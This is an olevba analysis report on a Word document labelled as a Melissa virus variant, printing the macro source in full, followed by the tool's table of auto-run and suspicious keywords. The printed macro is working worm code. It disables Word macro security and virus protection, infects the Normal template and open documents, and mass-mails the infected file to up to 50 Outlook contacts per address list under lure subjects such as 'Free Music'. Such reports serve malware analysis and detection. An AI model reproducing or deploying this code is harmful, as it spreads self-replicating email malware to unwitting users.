olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa.ah-af662162c74ad2c10d1a7d0087d8149f62c731ee
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Empirical.cls 
in file: Virus.MSWord.Melissa.ah-af662162c74ad2c10d1a7d0087d8149f62c731ee - OLE stream: 'Macros/VBA/Empirical'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Close()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub Document_New()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub AutoExec()
  On Error Resume Next
  Call Empirical
End Sub
Private Sub Empirical()
  'based on or guided by experience,
  'experiment or observation,
  'as distinct from theory.
  On Error Resume Next
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
  Else
    CommandBars("Tools").Controls("Macro").Enabled = False
    Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
  End If
  CommandBars("Visual Basic").Enabled = False

  Set ADI1 = ActiveDocument.VBProject.VBComponents.Item(1)
  Set NTI1 = NormalTemplate.VBProject.VBComponents.Item(1)
  NTCL = NTI1.CodeModule.countoflines
  ADCL = ADI1.CodeModule.countoflines
  BGN = 2

  If ADI1.Name <> "Empirical" Or ADCL < 20 Then
    If ADCL > 0 Then ADI1.CodeModule.DeleteLines 1, ADCL
    Set toinfect = ADI1
    ADI1.Name = "Empirical"
    DoAD = True
  End If

  If NTI1.Name <> "Empirical" Or NTCL < 20 Then
    If NTCL > 0 Then NTI1.CodeModule.DeleteLines 1, NTCL
    Set toinfect = NTI1
    NTI1.Name = "Empirical"
    DoNT = True
  End If

  If DoNT <> True And DoAD <> True Then GoTo BYE

  If DoNT = True Then
    toinfect.CodeModule.addfromstring ("Private Sub Document_Open()" & vbCrLf & ADI1.CodeModule.Lines(2, ADI1.CodeModule.countoflines))
  End If

  If DoAD = True Then
    toinfect.CodeModule.addfromstring ("Private Sub Document_Close()" & vbCrLf & NTI1.CodeModule.Lines(2, NTI1.CodeModule.countoflines))
  End If

BYE:
  Dim UngaDasOutlook, DasMapiName, BreakUmOffASlice
  Set UngaDasOutlook = CreateObject("Outlook.Application")
  Set DasMapiName = UngaDasOutlook.GetNameSpace("MAPI")
  If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") <> "Empirical" Then
    If UngaDasOutlook = "Outlook" Then
      DasMapiName.Logon "profile", "password"
      For y = 1 To DasMapiName.AddressLists.Count
        Set AddyBook = DasMapiName.AddressLists(y)
        x = 1
        Set BreakUmOffASlice = UngaDasOutlook.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
          Peep = AddyBook.AddressEntries(x)
          BreakUmOffASlice.Recipients.Add Peep
          x = x + 1
          If x > 50 Then oo = AddyBook.AddressEntries.Count
        Next oo
        s = Int(Rnd * 7)
        Select Case s
          Case 0
            BreakUmOffASlice.Subject = "Question for you..."
            BreakUmOffASlice.Body = "It's fairly complicated so I've attached it."
          Case 1
            BreakUmOffASlice.Subject = "Check this!!"
            BreakUmOffASlice.Body = "This is some wicked stuff!"
          Case 2
            BreakUmOffASlice.Subject = "Cool Web Sites"
            BreakUmOffASlice.Body = "Check out the Attached Document for a list of some of the best Sites on the Web"
          Case 3
            BreakUmOffASlice.Subject = "80mb Free Web Space!"
            BreakUmOffASlice.Body = "Check out the Attached Document for details on how to obtain the free space.  It's cool, I've now got heaps of room."
          Case 4
            BreakUmOffASlice.Subject = "Cheap Software"
            BreakUmOffASlice.Body = "The attached document contains a list of web sites where you can obtain Cheap Software"
          Case 5
            BreakUmOffASlice.Subject = " Cheap Hardware"
            BreakUmOffASlice.Body = " I've attached a list of web sites where you can obtain Cheap Hardware"
          Case 6
            BreakUmOffASlice.Subject = "Free Music"
            BreakUmOffASlice.Body = " Here is a list of places where you can obtain Free Music."
          Case 7
            s1 = Int(Rnd * 126) + 32
            BreakUmOffASlice.Subject = Chr$(s1) & " Free Downloads"
            BreakUmOffASlice.Body = " Here is a list of sites where you can obtain Free Downloads."
        End Select
        BreakUmOffASlice.Attachments.Add ActiveDocument.FullName
        BreakUmOffASlice.send
        Peep = ""
      Next y
    DasMapiName.Logoff
    End If
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") = "Empirical"
  End If
  
  If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
    ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
  ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
    ActiveDocument.Saved = True
  End If
  If Minute(Now) = Hour(Now) Then Selection.TypeText " All empires fall, you just have to know where to push. ": ActiveDocument.SaveAs FileName:=ActiveDocument.FullName: ActiveDocument.Saved = True:  System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Profiles") = ""
End Sub






































































































































+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|addfromstring       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

